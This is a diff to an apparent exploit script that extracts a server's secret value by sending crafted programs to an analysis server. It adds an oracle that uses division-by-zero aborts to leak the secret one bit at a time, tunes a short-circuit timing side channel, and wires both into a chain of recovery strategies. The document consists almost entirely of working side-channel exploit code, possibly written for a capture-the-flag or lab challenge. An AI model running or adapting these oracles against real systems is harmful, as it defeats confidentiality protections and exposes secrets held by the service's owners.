@@ -425,6 +425,73 @@ def make_bit_abort_oracle_program(*, bit_index: int) -> str:
 """
 
 
+def make_bit_expr_abort_oracle_program(*, bit_index: int, mode: str) -> str:
+    divisor = 1 << bit_index
+    if mode == "and":
+        # With input=2^62 this predicate should be true for all valid secrets.
+        guard = "secret < input"
+        op = "&&"
+    elif mode == "or":
+        # Always-false low guard keeps syntax simple while forcing RHS evaluation
+        # if the runtime treats || normally.
+        guard = "input < input"
+        op = "||"
+    else:
+        raise ValueError(f"unknown mode: {mode}")
+    return f"""int main(int input, int secret) {{
+  //@label H;
+  bool witness = ({guard}) {op} ((1 / ((secret / {divisor}) % 2)) == 1);
+  return 0;
+}}
+"""
+
+
+def recover_from_bitwise_expr_abort_oracle(
+    *,
+    server_command: str,
+    userid: str,
+    timeout_s: float,
+    mode: str,
+) -> int:
+    bits: list[int] = []
+    oracle_input = SECRET_MAX_EXCLUSIVE if mode == "and" else 0
+
+    for bit in range(SECRET_BITS):
+        source = make_bit_expr_abort_oracle_program(bit_index=bit, mode=mode)
+        with ProgramFile(source) as path:
+            res = run_query(
+                server_command=server_command,
+                userid=userid,
+                program_path=path,
+                input_value=oracle_input,
+                timeout_s=timeout_s,
+            )
+        if res.kind == "success" and res.value is not None:
+            return res.value
+        if res.kind == "abort":
+            bits.append(0)
+            continue
+        if res.kind == "failure":
+            bits.append(1)
+            continue
+        raise StrategyFailed(
+            f"bitwise expr-{mode} oracle rejected at bit {bit} ({format_result(res)})"
+        )
+
+    candidate = sum((bit_val << idx) for idx, bit_val in enumerate(bits))
+    verified = verify_nearby_candidates(
+        server_command=server_command,
+        userid=userid,
+        candidate=candidate,
+        timeout_s=max(1.0, timeout_s),
+    )
+    if verified is not None:
+        return verified
+    raise StrategyFailed(
+        f"bitwise expr-{mode} oracle candidate failed final verification"
+    )
+
+
 def recover_from_bitwise_abort_oracle(
     *,
     server_command: str,
@@ -632,8 +699,13 @@ def make_timing_oracle_program(*, warmup_iters: int, burn_iters: int) -> str:
 
 
 def make_short_circuit_timing_program(*, term_count: int) -> str:
-    term = "((1 + 1) == 2)"
-    heavy = " && ".join([term] * term_count)
+    # Use input-dependent (non-constant-foldable) arithmetic terms so the true path
+    # does measurable work even under aggressive simplification.
+    terms = []
+    for i in range(term_count):
+        mod_base = 97 + (i % 61)
+        terms.append(f"((input % {mod_base}) == (input % {mod_base}))")
+    heavy = " && ".join(terms) if terms else "true"
     return f"""int main(int input, int secret) {{
   //@label H;
   bool burn = (secret < input) && ({heavy});
@@ -652,9 +724,9 @@ def recover_from_timing_oracle(
 ) -> int:
     calibration_repeats = max(5, repeats)
     burn_candidates = [6_000_000, 12_000_000, 24_000_000, 48_000_000, 96_000_000]
-    sc_term_candidates = [800, 1600, 3200, 6400, 12800, 25600]
-    min_ratio = 1.02
-    min_gap_s = 0.001
+    sc_term_candidates = [200, 400, 800, 1600, 3200, 6400]
+    min_ratio = 1.008
+    min_gap_s = 0.0004
 
     candidates: list[tuple[str, str]] = []
     for burn in burn_candidates:
@@ -732,7 +804,7 @@ def recover_from_timing_oracle(
 
             boundary_lo = classify(SECRET_MIN)
             boundary_hi = classify(SECRET_MAX_EXCLUSIVE)
-            if boundary_lo or not boundary_hi:
+            if boundary_lo == boundary_hi:
                 last_failure = (
                     "timing boundary check failed "
                     f"for {candidate_name} (at 0 => {boundary_lo}, at 2^62 => {boundary_hi})"
@@ -740,7 +812,9 @@ def recover_from_timing_oracle(
                 debug_log(debug, f"[timing] {last_failure}")
                 continue
 
-            return binary_search_oracle(classify)
+            if (not boundary_lo) and boundary_hi:
+                return binary_search_oracle(classify)
+            return binary_search_oracle(lambda mid: not classify(mid))
 
     raise StrategyFailed(last_failure)
 
@@ -864,6 +938,24 @@ def recover_server_secret(
                 server_command=server_command,
                 userid=userid,
                 timeout_s=tuned_query_timeout,
+            ),
+        ),
+        (
+            "bitwise expr abort oracle (and-guard)",
+            lambda: recover_from_bitwise_expr_abort_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                mode="and",
+            ),
+        ),
+        (
+            "bitwise expr abort oracle (or-guard)",
+            lambda: recover_from_bitwise_expr_abort_oracle(
+                server_command=server_command,
+                userid=userid,
+                timeout_s=tuned_query_timeout,
+                mode="or",
             ),
         ),
         (
